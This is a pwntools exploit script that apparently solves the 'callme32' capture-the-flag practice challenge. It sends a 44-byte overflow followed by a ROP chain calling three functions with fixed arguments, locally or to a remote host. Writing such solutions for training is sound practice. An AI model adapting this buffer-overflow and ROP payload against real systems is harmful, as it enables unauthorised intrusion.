#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './callme32'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

#gadget 
pppr = 0x080488a9

# info
callme_three = 0x80485b0
callme_two = 0x8048620
callme_one = 0x80485c0

# rop1
offset = 44
payload = 'A'*offset
payload += p32(callme_one) + p32(pppr) + p32(1) + p32(2) + p32(3) 
payload += p32(callme_two) + p32(pppr) + p32(1) + p32(2) + p32(3) 
payload += p32(callme_three) + p32(pppr) + p32(1) + p32(2) + p32(3)  

# debug()
sl(payload)

p.interactive()

